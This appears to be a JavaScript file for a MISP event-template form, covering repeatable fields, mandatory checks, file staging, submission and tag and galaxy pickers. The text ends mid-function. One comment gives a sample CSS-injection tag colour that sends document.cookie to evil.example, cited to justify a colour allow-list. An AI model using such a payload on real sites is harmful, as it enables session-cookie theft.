/*
 * MISP Event Templates — default-theme user form (Phase 2.3).
 *
 * Drives the form a template user fills in to instantiate an event
 * from a template. Scope of this commit: repeatable-field add/remove,
 * client-side mandatory-field guard, form helpers consumed by the
 * next commit's submit flow. The submit button is inert for now — a
 * follow-up commit wires the fetch() + FormData call to
 * /event_templates/instantiate/{id}, plus inline tag / galaxy
 * pickers reusing MISP's existing patterns.
 */
(function () {
    'use strict';

    var cfg = window.ET_USER_FORM_CONFIG || null;
    if (!cfg) { return; }

    function qsa(root, sel) {
        return Array.prototype.slice.call(root.querySelectorAll(sel));
    }

    // Tag.colour comes from the DB (settable by anyone with tag-edit
    // permission). Restrict to hex literals + a small set of named
    // colour keywords so a hostile colour like
    //   "red; background-image:url(http://evil.example/exfil?c="+document.cookie+")"
    // can't smuggle declarations into the swatch's style attribute.
    // Anything that doesn't match falls back to the neutral default.
    function safeColour(input) {
        var fallback = '#777';
        if (typeof input !== 'string') { return fallback; }
        var s = input.trim();
        if (/^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/.test(s)) {
            return s;
        }
        if (/^[a-zA-Z]{3,32}$/.test(s)) {
            return s;
        }
        return fallback;
    }

    // -----------------------------------------------------------------
    // Repeatable fields — add / remove entry rows.
    // -----------------------------------------------------------------

    function wireRepeatable() {
        document.addEventListener('click', function (e) {
            var $add = e.target.closest('.et-add-entry');
            if ($add) {
                e.preventDefault();
                addEntry($add.closest('.et-field'));
                return;
            }
            var $rm = e.target.closest('.et-remove-entry');
            if ($rm) {
                e.preventDefault();
                removeEntry($rm.closest('.et-entry'));
                return;
            }
        });
    }

    function addEntry($field) {
        if (!$field) { return; }
        var $entries = $field.querySelector('.et-entries');
        if (!$entries) { return; }
        var $first = $entries.querySelector('.et-entry');
        if (!$first) { return; }
        var $clone = $first.cloneNode(true);
        qsa($clone, 'input.et-value, textarea.et-value, select.et-value').forEach(function ($i) {
            if ($i.type === 'checkbox' || $i.type === 'radio') {
                $i.checked = false;
            } else {
                $i.value = '';
            }
            $i.classList.remove('et-invalid');
        });
        // Clones inherit any open/closed state of the first entry —
        // reset to collapsed + "empty" so a freshly-added object
        // instance is consistent regardless of how the user left the
        // original.
        if ($clone.classList.contains('et-object-entry')) {
            $clone.classList.remove('et-open');
            var $cloneBody = $clone.querySelector('.et-object-entry-body');
            if ($cloneBody) { $cloneBody.setAttribute('hidden', ''); }
            var $cloneToggle = $clone.querySelector('.et-object-toggle');
            if ($cloneToggle) { $cloneToggle.setAttribute('aria-expanded', 'false'); }
            var $cloneTitle = $clone.querySelector('.et-object-entry-title');
            if ($cloneTitle) { $cloneTitle.textContent = 'Expand to fill'; }
        }
        $entries.appendChild($clone);
        refreshObjectEntryIndicators($clone);
        refreshRemoveButtons($field);
    }

    function removeEntry($entry) {
        if (!$entry) { return; }
        var $field = $entry.closest('.et-field');
        var $entries = $entry.parentNode;
        // Don't let the user delete the last row — emptying is done by
        // clearing the inputs, not by having zero rows.
        if ($entries.querySelectorAll('.et-entry').length <= 1) {
            qsa($entry, 'input.et-value, textarea.et-value, select.et-value').forEach(function ($i) {
                if ($i.type === 'checkbox' || $i.type === 'radio') {
                    $i.checked = false;
                } else {
                    $i.value = '';
                }
            });
            refreshRemoveButtons($field);
            return;
        }
        $entries.removeChild($entry);
        refreshRemoveButtons($field);
    }

    function refreshRemoveButtons($field) {
        if (!$field) { return; }
        var $entries = qsa($field, '.et-entries > .et-entry');
        // Only show the × button when there's more than one row.
        var visible = $entries.length > 1;
        qsa($field, '.et-entries > .et-entry .et-remove-entry').forEach(function ($b) {
            $b.style.display = visible ? '' : 'none';
        });
    }

    // -----------------------------------------------------------------
    // Mandatory-field guard. Value-collection helpers are exposed on
    // window.ETUserForm so the next commit's submit wiring can pick
    // them up without another pass over the DOM.
    // -----------------------------------------------------------------

    // Tracks base64-encoded file_field uploads; keyed by element id.
    // Populated asynchronously when the user picks files; collectValues()
    // reads directly from here at submit time.
    var fileStaging = {};

    function wireFileInputs() {
        document.addEventListener('change', function (e) {
            var $input = e.target;
            if (!$input.matches || !$input.matches('.et-file-input[data-et-file-target]')) {
                return;
            }
            var id = $input.getAttribute('data-et-file-target');
            if (!id) { return; }
            var files = Array.prototype.slice.call($input.files || []);
            if (!files.length) {
                fileStaging[id] = [];
                renderFileList(id);
                updateSubmitEnabled();
                return;
            }
            fileStaging[id] = files.map(function (f) {
                return {filename: f.name, size: f.size, data: null, progress: 0};
            });
            renderFileList(id);
            updateSubmitEnabled();

            // Read each File into base64 asynchronously; re-render once
            // each completes. A FileReader per file is fine here — users
            // typically pick a handful, and browsers throttle internally.
            files.forEach(function (f, idx) {
                var reader = new FileReader();
                reader.onprogress = function (ev) {
                    if (!fileStaging[id] || !fileStaging[id][idx]) { return; }
                    if (ev.lengthComputable && ev.total > 0) {
                        fileStaging[id][idx].progress = ev.loaded / ev.total;
                        renderFileList(id);
                    }
                };
                reader.onload = function () {
                    // result is a data URL: "data:...;base64,AAAA..."
                    var b64 = String(reader.result || '').split(',')[1] || '';
                    if (fileStaging[id] && fileStaging[id][idx]) {
                        fileStaging[id][idx].data = b64;
                        fileStaging[id][idx].progress = 1;
                    }
                    renderFileList(id);
                    updateSubmitEnabled();
                };
                reader.onerror = function () {
                    if (fileStaging[id] && fileStaging[id][idx]) {
                        fileStaging[id][idx].error = 'read failed';
                    }
                    renderFileList(id);
                };
                reader.readAsDataURL(f);
            });
        });
    }

    function renderFileList(elementId) {
        var $list = document.querySelector(
            '[data-et-file-list-for="' + cssEscape(elementId) + '"]'
        );
        if (!$list) { return; }
        $list.innerHTML = '';
        var files = fileStaging[elementId] || [];
        files.forEach(function (f) {
            var $row = document.createElement('div');
            $row.style.padding = '4px 0';

            var $top = document.createElement('div');
            $top.style.cssText =
                'display:flex;justify-content:space-between;' +
                'align-items:center;gap:8px;';
            var $name = document.createElement('span');
            $name.textContent = f.filename;
            var $status = document.createElement('span');
            $status.style.cssText = 'font-size:11px;color:#666;flex-shrink:0;';
            var pct = Math.round((f.progress || 0) * 100);
            if (f.error) {
                $status.textContent = '⚠ ' + f.error;
                $status.style.color = '#c33';
            } else if (f.data === null) {
                $status.textContent = pct + '% · ' + humanSize(f.size);
            } else {
                $status.textContent = '✓ ' + humanSize(f.size);
                $status.style.color = '#2e7d32';
            }
            $top.appendChild($name);
            $top.appendChild($status);
            $row.appendChild($top);

            // Inline-styled progress bar — works on both themes without
            // depending on Bootstrap version's progress class. Hidden
            // once the read completes (✓ status alone reads cleaner).
            if (!f.error && f.data === null) {
                var $bar = document.createElement('div');
                $bar.style.cssText =
                    'height:4px;background:#e9ecef;border-radius:2px;' +
                    'overflow:hidden;margin-top:3px;';
                var $fill = document.createElement('div');
                $fill.style.cssText =
                    'height:100%;background:#0d6efd;' +
                    'transition:width 0.15s linear;width:' + pct + '%;';
                $bar.appendChild($fill);
                $row.appendChild($bar);
            }

            $list.appendChild($row);
        });
    }

    function humanSize(n) {
        if (!n || n <= 0) { return '0 B'; }
        if (n < 1024) { return n + ' B'; }
        if (n < 1024 * 1024) { return (n / 1024).toFixed(1) + ' KiB'; }
        return (n / (1024 * 1024)).toFixed(1) + ' MiB';
    }

    function collectValues() {
        var values = {};
        qsa(document, '#et-user-form .et-field').forEach(function ($field) {
            var id = $field.getAttribute('data-et-element-id');
            var type = $field.getAttribute('data-et-element-type');
            if (!id || !type) { return; }
            if (type === 'file_field') {
                var files = (fileStaging[id] || []).filter(function (f) {
                    return f && f.data;
                }).map(function (f) {
                    return {filename: f.filename, data: f.data};
                });
                if (!files.length) { return; }
                if ($field.getAttribute('data-et-repeatable') === '1') {
                    values[id] = files;
                } else {
                    values[id] = files[0];
                }
                return;
            }
            if (type === 'object_field') {
                var instances = qsa($field, '.et-entries > .et-entry').map(collectEntryRelations);
                // Scalar object if not repeatable, array otherwise.
                if ($field.getAttribute('data-et-repeatable') === '1') {
                    instances = instances.filter(function (o) {
                        return Object.keys(o).length > 0;
                    });
                    if (instances.length) { values[id] = instances; }
                } else if (instances.length) {
                    var obj = instances[0];
                    if (Object.keys(obj).length > 0) { values[id] = obj; }
                }
                return;
            }

            var isCsv = !!$field.querySelector('[data-et-csv="1"]');

            // Attribute / object fields wrap their input(s) in
            // .et-entries > .et-entry; tag / galaxy fields render a
            // single flat input directly under .et-field. Fall back to
            // field-level lookup when the entry wrapper isn't present.
            var $entries = qsa($field, '.et-entries > .et-entry');
            if (!$entries.length) {
                $entries = qsa($field, '.et-value[data-et-path]').map(function ($i) {
                    return $i;
                });
            }
            var entryVals = $entries.map(function ($scope) {
                var $input = $scope.classList && $scope.classList.contains('et-value')
                    ? $scope
                    : $scope.querySelector('.et-value[data-et-path]');
                if (!$input) { return ''; }
                return $input.value;
            });

            if (isCsv) {
                var pieces = [];
                entryVals.forEach(function (v) {
                    (v || '').split(',').forEach(function (p) {
                        p = p.trim();
                        if (p) { pieces.push(p); }
                    });
                });
                if (pieces.length === 1 && $field.getAttribute('data-et-multiple') !== '1') {
                    values[id] = pieces[0];
                } else if (pieces.length > 0) {
                    values[id] = pieces;
                }
                return;
            }

            if ($field.getAttribute('data-et-repeatable') === '1') {
                var filtered = entryVals.map(function (v) { return (v || '').trim(); })
                    .filter(function (v) { return v !== ''; });
                if (filtered.length) { values[id] = filtered; }
            } else {
                var v = (entryVals[0] || '').trim();
                if (v !== '') { values[id] = v; }
            }
        });
        return values;
    }

    function collectEntryRelations($entry) {
        var obj = {};
        qsa($entry, '.et-value[data-et-path]').forEach(function ($i) {
            var path = $i.getAttribute('data-et-path');
            // path is "<id>.<relation>"
            var rel = path.split('.').slice(1).join('.');
            var v = ($i.value || '').trim();
            if (v !== '') { obj[rel] = v; }
        });
        return obj;
    }

    function validateMandatory() {
        var missing = [];
        qsa(document, '#et-user-form .et-field[data-et-mandatory="1"]').forEach(function ($field) {
            $field.classList.remove('et-missing');
            qsa($field, '.et-value').forEach(function ($i) { $i.classList.remove('et-invalid'); });
            var id = $field.getAttribute('data-et-element-id');
            var type = $field.getAttribute('data-et-element-type');
            var label = ($field.querySelector('label') || {}).textContent || id;
            label = label.replace(/\s*\*\s*$/, '').trim();

            var filled = false;
            if (type === 'object_field') {
                // Mandatory object_field: at least one instance with any value.
                qsa($field, '.et-entries > .et-entry').forEach(function ($entry) {
                    qsa($entry, '.et-value[data-et-path]').forEach(function ($i) {
                        if (($i.value || '').trim() !== '') { filled = true; }
                    });
                });
            } else if (type === 'file_field') {
                // Mandatory file_field: at least one fully-read file.
                var stagedFiles = fileStaging[id] || [];
                filled = stagedFiles.some(function (f) {
                    return f && f.data;
                });
            } else {
                qsa($field, '.et-value[data-et-path]').forEach(function ($i) {
                    if (($i.value || '').trim() !== '') { filled = true; }
                });
            }
            if (!filled) {
                missing.push(label || id);
                if (type === 'object_field' || type === 'file_field') {
                    // Mark the container, not every input inside. An
                    // object_field's relations aren't individually
                    // required (the object template's `requirements` /
                    // `requiredOneOf` shape the real constraint), so
                    // reddening each relation would be misleading. A
                    // file_field has no individual inputs to mark.
                    $field.classList.add('et-missing');
                } else {
                    qsa($field, '.et-value').forEach(function ($i) {
                        $i.classList.add('et-invalid');
                    });
                }
            }
        });
        return missing;
    }

    function updateSubmitEnabled() {
        if (cfg.isPreview) { return; }
        var $btn = document.getElementById('et-user-form-submit');
        if (!$btn) { return; }
        var missing = validateMandatory();
        if (missing.length === 0) {
            $btn.disabled = false;
            $btn.title = '';
        } else {
            $btn.disabled = true;
            $btn.title = 'Missing: ' + missing.join(', ');
        }
    }

    function wireMandatoryGuard() {
        // Recompute on any input change across the whole form.
        document.addEventListener('input', function (e) {
            if (e.target.closest('#et-user-form')) {
                updateSubmitEnabled();
                refreshObjectEntryIndicators(e.target.closest('.et-object-entry'));
            }
        });
        document.addEventListener('change', function (e) {
            if (e.target.closest('#et-user-form')) {
                updateSubmitEnabled();
                refreshObjectEntryIndicators(e.target.closest('.et-object-entry'));
            }
        });
    }

    // -----------------------------------------------------------------
    // Collapsible object_field entries.
    // -----------------------------------------------------------------

    function wireObjectCollapsing() {
        // Delegate click on the entry header (everything except the
        // remove-entry × button) — clicking the caret, the label, or
        // the filled-indicator chip all toggle.
        document.addEventListener('click', function (e) {
            if (e.target.closest('.et-remove-entry')) { return; }
            var $header = e.target.closest('.et-object-entry-header');
            if (!$header) { return; }
            e.preventDefault();
            toggleObjectEntry($header.closest('.et-object-entry'));
        });
    }

    function toggleObjectEntry($entry) {
        if (!$entry) { return; }
        var $body = $entry.querySelector('.et-object-entry-body');
        var $toggle = $entry.querySelector('.et-object-toggle');
        var $title = $entry.querySelector('.et-object-entry-title');
        var open = !$entry.classList.contains('et-open');
        $entry.classList.toggle('et-open', open);
        if ($body) {
            if (open) { $body.removeAttribute('hidden'); }
            else { $body.setAttribute('hidden', ''); }
        }
        if ($toggle) { $toggle.setAttribute('aria-expanded', open ? 'true' : 'false'); }
        if ($title) {
            $title.textContent = open ? 'Collapse' : 'Expand to fill';
        }
    }

    function refreshObjectEntryIndicators($entry) {
        // When called with an entry, refresh just that one. When called
        // with nothing, refresh every entry on the form (used on init
        // and after add/remove).
        var entries = $entry
            ? [$entry]
            : qsa(document, '#et-user-form .et-object-entry');
        entries.forEach(function ($e) {
            if (!$e) { return; }
            var $field = $e.closest('.et-field');
            var mandatoryParent = $field && $field.getAttribute('data-et-mandatory') === '1';
            var filled = qsa($e, '.et-value[data-et-path]').some(function ($i) {
                return ($i.value || '').trim() !== '';
            });
            var $ind = $e.querySelector('.et-object-filled-indicator');
            if (!$ind) { return; }
            if (filled) {
                $ind.setAttribute('data-et-filled-state', 'filled');
                $ind.textContent = '✓ filled';
            } else if (mandatoryParent) {
                $ind.setAttribute('data-et-filled-state', 'missing');
                $ind.textContent = 'required — empty';
            } else {
                $ind.setAttribute('data-et-filled-state', 'empty');
                $ind.textContent = 'empty';
            }
        });
    }

    // -----------------------------------------------------------------
    // Submit flow — POST /event_templates/instantiate/{id}.
    // -----------------------------------------------------------------

    var submitting = false;

    function wireSubmit() {
        var $btn = document.getElementById('et-user-form-submit');
        if (!$btn) { return; }
        $btn.addEventListener('click', function (e) {
            e.preventDefault();
            submit();
        });
    }

    function submit() {
        if (submitting || cfg.isPreview) { return; }
        var $form = document.getElementById('et-user-form');
        var $btn = document.getElementById('et-user-form-submit');
        var $status = document.getElementById('et-user-form-status');
        if (!$form) { return; }

        var missing = validateMandatory();
        if (missing.length > 0) {
            renderErrors(['Missing mandatory fields: ' + missing.join(', ')]);
            return;
        }

        var url = $form.getAttribute('data-et-instantiate-url') ||
            (cfg.baseurl + '/event_templates/instantiate/' + cfg.templateId);
        var body = {values: collectValues()};

        submitting = true;
        renderErrors([]);
        if ($btn) {
            $btn.disabled = true;
            $btn.dataset.etOrigLabel = $btn.dataset.etOrigLabel || $btn.textContent;
            $btn.textContent = 'Creating event…';
        }
        if ($status) { $status.textContent = ''; }

        fetch(url, {
            method: 'POST',
            credentials: 'same-origin',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(body)
        }).then(function (r) {
            return r.json().then(function (data) {
                return {status: r.status, data: data};
            });
        }).then(function (res) {
            if (res.status >= 200 && res.status < 300 && res.data && res.data.event_id) {
                // Redirect to the newly-created event.
                window.location.href = cfg.baseurl + '/events/view/' + res.data.event_id;
                return;
            }
            submitting = false;
            if ($btn) {
                $btn.disabled = false;
                $btn.textContent = $btn.dataset.etOrigLabel || 'Create event';
            }
            renderErrors(extractErrors(res.data));
            // Re-run mandatory guard in case the user edits a field.
            updateSubmitEnabled();
        }).catch(function (err) {
            submitting = false;
            if ($btn) {
                $btn.disabled = false;
                $btn.textContent = $btn.dataset.etOrigLabel || 'Create event';
            }
            renderErrors(['Network error: ' + (err && err.message ? err.message : err)]);
            updateSubmitEnabled();
        });
    }

    function extractErrors(data) {
        if (!data) { return ['Unknown error.']; }
        if (Array.isArray(data.errors)) { return data.errors; }
        if (data.errors && typeof data.errors === 'object') {
            var out = [];
            Object.keys(data.errors).forEach(function (field) {
                var list = data.errors[field];
                if (Array.isArray(list)) {
                    list.forEach(function (msg) { out.push(field + ': ' + msg); });
                } else {
                    out.push(field + ': ' + list);
                }
            });
            return out;
        }
        if (data.message) { return [data.message]; }
        return ['Unknown error.'];
    }

    function renderErrors(errors) {
        var $panel = document.getElementById('et-user-form-errors');
        if (!$panel) { return; }
        $panel.innerHTML = '';
        if (!errors || !errors.length) { return; }
        var $alert = document.createElement('div');
        $alert.className = 'alert alert-error';
        var $h = document.createElement('strong');
        $h.textContent = 'Could not create event:';
        $alert.appendChild($h);
        var $ul = document.createElement('ul');
        errors.forEach(function (err) {
            var $li = document.createElement('li');
            $li.textContent = String(err);
            $ul.appendChild($li);
        });
        $alert.appendChild($ul);
        $panel.appendChild($alert);
        // Scroll the error into view so the user sees it.
        $panel.scrollIntoView({behavior: 'smooth', block: 'start'});
    }

    // Expose collection helpers + the mandatory check so other page
    // JS (e.g. future preview extensions) can reuse them.
    window.ETUserForm = {
        collectValues: collectValues,
        validateMandatory: validateMandatory,
        submit: submit
    };

    // -----------------------------------------------------------------
    // Tag picker — inline modal reusing MISP's /tags/index.json source.
    //
    // For a typical instance there are thousands of tags, so we fetch
    // on first open and cache the result in-memory for the rest of the
    // page lifetime. When the tag_field element declares
    // restrict_taxonomies, the list is filtered client-side to names
    // whose taxonomy namespace (prefix before ':') matches.
    // -----------------------------------------------------------------

    var tagCache = null;      // full list of {name, colour}
    var tagCacheLoading = null; // promise while the fetch is in flight
    var tagPickerCtx = null;  // {elementId, multiple, restrict}

    function wireTagPicker() {
        document.addEventListener('click', function (e) {
            var $btn = e.target.closest('[data-et-open-tag-picker]');
            if ($btn) {
                e.preventDefault();
                openTagPicker($btn.getAttribute('data-et-open-tag-picker'));
            }
        });
        var $search = document.getElementById('et-tag-picker-search');
        if ($search) {
            $search.addEventListener('input', function () {
                filterTagPicker($search.value);
            });
        }
        var $apply = document.getElementById('et-tag-picker-apply');
        if ($apply) {
            $apply.addEventListener('click', function (e) {
                e.preventDefault();
                applyTagPicker();
            });
        }
    }

    function openTagPicker(elementId) {
        var $field = document.querySelector('.et-field[data-et-element-id="' + cssEscape(elementId) + '"]');
        if (!$field) { return; }
        var restrictJson = $field.getAttribute('data-et-restrict-taxonomies') || '[]';
        var restrict = [];
        try { restrict = JSON.parse(restrictJson); } catch (e) { restrict = []; }
        var multiple = $field.getAttribute('data-et-multiple') === '1';
        var $input = $field.querySelector('input.et-value[data-et-path]');
        var currentCsv = ($input && $input.value) || '';

        tagPickerCtx = {
            elementId: elementId,
            multiple: multiple,
            restrict: restrict.map(function (t) { return String(t).trim(); }).filter(Boolean),
            targetInput: $input,
            preChecked: currentCsv.split(',')
                .map(function (s) { return s.trim(); })
                .filter(Boolean)
        };

        var $hint = document.getElementById('et-tag-picker-restriction-hint');
        if ($hint) {
            if (tagPickerCtx.restrict.length) {
                $hint.textContent =
                    'Restricted to taxonomies: ' + tagPickerCtx.restrict.join(', ');
            } else {
                $hint.textContent = 'Any enabled taxonomy allowed.';
            }
        }
        var $search = document.getElementById('et-tag-picker-search');
        if ($search) { $search.value = ''; }

        var $modal = document.getElementById('et-tag-picker-modal');
        if ($modal) {
            // Prefer Bootstrap 5's native API (Overmind ships
            // bootstrap.bundle.min.js, no BS2 jQuery plugin); fall back
            // to jQuery .modal('show') for the default BS2 theme.
            if (window.bootstrap && window.bootstrap.Modal) {
                window.bootstrap.Modal.getOrCreateInstance($modal).show();
            } else if (window.jQuery) {
                window.jQuery($modal).modal('show');
            }
            if ($search) { setTimeout(function () { $search.focus(); }, 150); }
        }

        ensureTagCache().then(function () {
            renderTagPickerList();
        }).catch(function (err) {
            var $loading = document.getElementById('et-tag-picker-loading');
            if ($loading) {
                $loading.textContent =
                    'Failed to load tags: ' + (err && err.message ? err.message : err);
            }
        });
    }

    function ensureTagCache() {
        if (tagCache !== null) { return Promise.resolve(); }
        if (tagCacheLoading) { return tagCacheLoading; }
        var $loading = document.getElementById('et-tag-picker-loading');
        var $list = document.getElementById('et-tag-picker-list');
        if ($loading) { $loading.style.display = ''; }
        if ($list) { $list.innerHTML = ''; }

        tagCacheLoading = fetch(cfg.baseurl + '/tags/index.json', {
            method: 'GET',
            credentials: 'same-origin',
            headers: {
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
        }).then(function (r) {
            if (!r.ok) { throw new Error('HTTP ' + r.status); }
            return r.json();
        }).then(function (data) {
            // /tags/index.json returns { "Tag": [ {id, name, colour, hide_tag, is_galaxy, ...}, ... ] }
            var rows = (data && data.Tag) ? data.Tag : [];
            tagCache = rows.filter(function (t) {
                return !t.hide_tag && !t.is_galaxy;
            }).map(function (t) {
                return {
                    name: (t.name || '').replace(/^\s+/, ''), // leading whitespace slips in sometimes
                    colour: t.colour || '#777'
                };
            });
            tagCache.sort(function (a, b) {
                return a.name.localeCompare(b.name);
            });
            tagCacheLoading = null;
        }).catch(function (err) {
            tagCacheLoading = null;
            throw err;
        });
        return tagCacheLoading;
    }

    function renderTagPickerList() {
        var $loading = document.getElementById('et-tag-picker-loading');
        if ($loading) { $loading.style.display = 'none'; }
        var $list = document.getElementById('et-tag-picker-list');
        if (!$list || !tagPickerCtx) { return; }
        var restrict = tagPickerCtx.restrict;
        var filtered = tagCache.filter(function (t) {
            if (!restrict.length) { return true; }
            // Match tag names whose taxonomy prefix (before ':') is in the list.
            var i = t.name.indexOf(':');
            if (i === -1) { return false; }
            var ns = t.name.slice(0, i);
            return restrict.indexOf(ns) !== -1;
        });
        var preSet = {};
        tagPickerCtx.preChecked.forEach(function (n) { preSet[n] = true; });
        $list.innerHTML = '';
        if (!filtered.length) {
            $list.innerHTML =
                '<div style="padding:20px; text-align:center; color:#888;">' +
                '<em>No tags match this restriction.</em></div>';
            return;
        }
        filtered.forEach(function (t) {
            var $label = document.createElement('label');
            $label.className = 'et-tag-picker-item';
            $label.setAttribute('data-search', t.name.toLowerCase());
            var $cb = document.createElement('input');
            $cb.type = 'checkbox';
            $cb.value = t.name;
            if (preSet[t.name]) { $cb.checked = true; }
            var $swatch = document.createElement('span');
            $swatch.className = 'et-tag-swatch';
            $swatch.style.background = safeColour(t.colour);
            var $name = document.createElement('span');
            $name.textContent = t.name;
            $label.appendChild($cb);
            $label.appendChild($swatch);
            $label.appendChild($name);
            $list.appendChild($label);
        });
    }

    function filterTagPicker(term) {
        term = (term || '').toLowerCase().trim();
        qsa(document, '#et-tag-picker-list .et-tag-picker-item').forEach(function ($item) {
            if (!term) { $item.style.display = ''; return; }
            var hay = $item.getAttribute('data-search') || '';
            $item.style.display = hay.indexOf(term) === -1 ? 'none' : '';
        });
    }

    function applyTagPicker() {
        if (!tagPickerCtx) { return; }
        var picked = [];
        qsa(document, '#et-tag-picker-list .et-tag-picker-item input[type=checkbox]')
            .forEach(function ($cb) { if ($cb.checked) { picked.push($cb.value); } });
        if (tagPickerCtx.targetInput) {
            if (!tagPickerCtx.multiple && picked.length > 1) {
                // Respect single-tag constraint: keep the first.
                picked = picked.slice(0, 1);
            }
            tagPickerCtx.targetInput.value = picked.join(', ');
            tagPickerCtx.targetInput.dispatchEvent(new Event('input', {bubbles: true}));
        }
        var $modal = document.getElementById('et-tag-picker-modal');
        if ($modal) {
            if (window.bootstrap && window.bootstrap.Modal) {
                var inst = window.bootstrap.Modal.getInstance($modal);
                if (inst) { inst.hide(); }
            } else if (window.jQuery) {
                window.jQuery($modal).modal('hide');
            }
        }
        tagPickerCtx = null;
    }

    // Tiny CSS-escape polyfill for element ids we use in selectors —
    // element ids are already validated against the PRD identifier
    // pattern server-side, but an extra layer doesn't hurt.
    function cssEscape(s) {
        if (window.CSS && window.CSS.escape) { return window.CSS.escape(s); }
        return String(s).replace(/[^a-zA-Z0-9_-]/g, function (c) {
            return '\\' + c;
        });
    }

    // -----------------------------------------------------------------
    // Galaxy cluster picker — server-side search, scoped to the field's
    // restrict_galaxy_types. Mirrors the tag picker's modal flow but
    // hits /galaxy_clusters/search?galaxy_type=<type>&q=<term> per-type
    // and merges results client-side (the restriction can list more
    // than one galaxy type).
    // -----------------------------------------------------------------

    var galaxyPickerCtx = null;
    var galaxyPickerSearchTimer = null;

    function wireGalaxyPicker() {
        document.addEventListener('click', function (e) {
            var $btn = e.target.closest('[data-et-open-galaxy-picker]');
            if ($btn) {
                e.preventDefault();
                openGalaxyPicker($btn.getAttribute('data-et-open-galaxy-picker'));
            }
        });
        var $search = document.getElementById('et-galaxy-picker-search');
        if ($search) {
            $search.addEventListener('input', function () {
                if (galaxyPickerSearchTimer) {
                    clearTimeout(galaxyPickerSearchTimer);
                }
                galaxyPickerSearchTimer = setTimeout(function () {
                    runGalaxyPickerSearch($search.value);
                }, 200);
            });
        }
        var $apply = document.getElementById('et-galaxy-picker-apply');
        if ($apply) {
            $apply.addEventListener('click', function (e) {
                e.preventDefault();
                applyGalaxyPicker();
            });
        }
    }

    function openGalaxyPicker(elementId) {
        var $field = document.querySelector('.et-field[data-et-element-id="' + cssEscape(elementId) + '"]');
        if (!$field) { return; }
        var restrictJson = $field.getAttribute('data-et-restrict-galaxy-types') || '[]';
        var restrict = [];
        try { restrict = JSON.parse(restrictJson); } catch (e) { restrict = []; }
        var multiple = $field.getAttribute('data-et-multiple') === '1';
        var $input = $field.querySelector('input.et-value[data-et-path]');
        var currentCsv = ($input && $input.value) || '';

        galaxyPickerCtx = {
            elementId: elementId,
            multiple: multiple,
            restrict: restrict.map(function (t) { return String(t).trim(); }).filter(Boolean),
            targetInput: $input,
            preChecked: currentCsv.split(',')
                .map(function (s) { return s.trim(); })
                .filter(Boolean),
            // Cache of {value, label, description, uuid} keyed by label
            // so re-rendering after a search / apply preserves selections
            // outside the current visible result set.
            stickySelected: {}
        };
        // Seed sticky-selected with current values so they stay checked
        // even when the user types a search that filters them out.
        galaxyPickerCtx.preChecked.forEach(function (label) {
            galaxyPickerCtx.stickySelected[label] = {label: label, description: ''};
        });

        var $hint = document.getElementById('et-galaxy-picker-restriction-hint');
        if ($hint) {
            if (galaxyPickerCtx.restrict.length) {
                $hint.textContent =
                    'Searching galaxy types: ' + galaxyPickerCtx.restrict.join(', ');
            } else {
                $hint.textContent = 'No galaxy-type restriction — picker disabled. Type values manually.';
            }
        }
        var $search = document.getElementById('et-galaxy-picker-search');
        if ($search) { $search.value = ''; }

        var $modal = document.getElementById('et-galaxy-picker-modal');
        if ($modal) {
            if (window.bootstrap && window.bootstrap.Modal) {
                window.bootstrap.Modal.getOrCreateInstance($modal).show();
            } else if (window.jQuery) {
                window.jQuery($modal).modal('show');
            }
            if ($search) { setTimeout(function () { $search.focus(); }, 150); }
        }

        if (!galaxyPickerCtx.restrict.length) {
            renderGalaxyPickerStatus('Picker requires at least one galaxy_type on the field.');
            renderGalaxyPickerList([]);
            return;
        }
        // Initial fetch with empty query — shows the first 50 clusters
        // per restricted type so the modal is never empty on open.
        runGalaxyPickerSearch('');
    }

    function runGalaxyPickerSearch(query) {
        if (!galaxyPickerCtx) { return; }
        if (!galaxyPickerCtx.restrict.length) { return; }
        renderGalaxyPickerStatus('Searching…');
        var fetches = galaxyPickerCtx.restrict.map(function (type) {
            var url = cfg.baseurl + '/galaxy_clusters/search?galaxy_type='
                + encodeURIComponent(type)
                + (query ? '&q=' + encodeURIComponent(query) : '');
            return fetch(url, {
                method: 'GET',
                credentials: 'same-origin',
                headers: {
                    'Accept': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            }).then(function (r) {
                if (!r.ok) { return []; }
                return r.json();
            }).catch(function () { return []; });
        });
        Promise.all(fetches).then(function (results) {
            var seen = {};
            var merged = [];
            results.forEach(function (rows) {
                (rows || []).forEach(function (row) {
                    if (!row || !row.label) { return; }
                    if (seen[row.label]) { return; }
                    seen[row.label] = true;
                    merged.push(row);
                });
            });
            renderGalaxyPickerList(merged);
            if (merged.length === 0) {
                renderGalaxyPickerStatus(query
                    ? 'No clusters match "' + query + '".'
                    : 'No clusters available.');
            } else {
                renderGalaxyPickerStatus(merged.length >= 50
                    ? 'Showing first 50 matches per galaxy type. Refine search to narrow.'
                    : merged.length + ' result' + (merged.length === 1 ? '' : 's') + '.');
            }
        });
    }

    function renderGalaxyPickerStatus(text) {
        var $status = document.getElementById('et-galaxy-picker-status');
        if ($status) { $status.textContent = text || ''; }
    }

    function renderGalaxyPickerList(rows) {
        var $list = document.getElementById('et-galaxy-picker-list');
        if (!$list || !galaxyPickerCtx) { return; }
        var preSet = {};
        galaxyPickerCtx.preChecked.forEach(function (n) { preSet[n] = true; });
        $list.innerHTML = '';
        rows.forEach(function (row) {
            var label = row.label || '';
            var desc = row.description || '';
            // Cache visible rows by label so applyGalaxyPicker has the
            // canonical metadata on hand even if the user re-searches.
            galaxyPickerCtx.stickySelected[label] = galaxyPickerCtx.stickySelected[label] || {
                label: label,
                description: desc
            };
            var $label = document.createElement('label');
            $label.className = 'et-galaxy-picker-item';
            $label.setAttribute('data-galaxy-label', label);
            var $cb = document.createElement('input');
            $cb.type = 'checkbox';
            $cb.value = label;
            if (preSet[label]) { $cb.checked = true; }
            $cb.addEventListener('change', function () {
                if (this.checked) {
                    if (!galaxyPickerCtx.preChecked.includes(label)) {
                        galaxyPickerCtx.preChecked.push(label);
                    }
                } else {
                    galaxyPickerCtx.preChecked = galaxyPickerCtx.preChecked
                        .filter(function (x) { return x !== label; });
                }
            });
            var $name = document.createElement('span');
            $name.className = 'et-galaxy-picker-name';
            $name.textContent = label;
            $label.appendChild($cb);
            $label.appendChild($name);
            if (desc) {
                var $desc = document.createElement('span');
                $desc.className = 'et-galaxy-picker-desc';
